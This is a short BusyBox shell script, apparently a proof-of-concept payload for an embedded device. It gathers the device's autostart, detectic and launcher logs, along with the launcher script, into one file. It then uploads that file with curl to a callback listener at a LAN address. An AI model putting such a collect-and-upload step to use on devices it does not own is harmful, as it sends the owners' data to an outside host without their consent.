#!/bin/sh
CB="http://192.168.0.27:8080"
BB=/bin/busybox
DIR="/var/run/misc/misc_rw/detectic"
OUT="/tmp/dump_logs.txt"
$BB rm -f "$OUT"
$BB touch "$OUT"

echo "=== autostart.log ===" >> "$OUT"
$BB cat "$DIR/autostart.log" 2>/dev/null >> "$OUT"
echo "=== autostart.log.tmp ===" >> "$OUT"
$BB cat "$DIR/autostart.log.tmp" 2>/dev/null >> "$OUT"
echo "=== detectic.log ===" >> "$OUT"
$BB head -n 100 "$DIR/detectic.log" 2>/dev/null >> "$OUT"
echo "=== detectic.log.tmp ===" >> "$OUT"
$BB cat "$DIR/detectic.log.tmp" 2>/dev/null >> "$OUT"
echo "=== launcher.sh ===" >> "$OUT"
$BB head -n 200 "$DIR/launcher.sh" 2>/dev/null >> "$OUT"
echo "=== launch.trace ===" >> "$OUT"
$BB cat /var/tmp/launcher.trace 2>/dev/null >> "$OUT"

/usr/sbin/curl -m 15 -T "$OUT" "${CB}/proof_log?tag=dump" 2>/dev/null || true
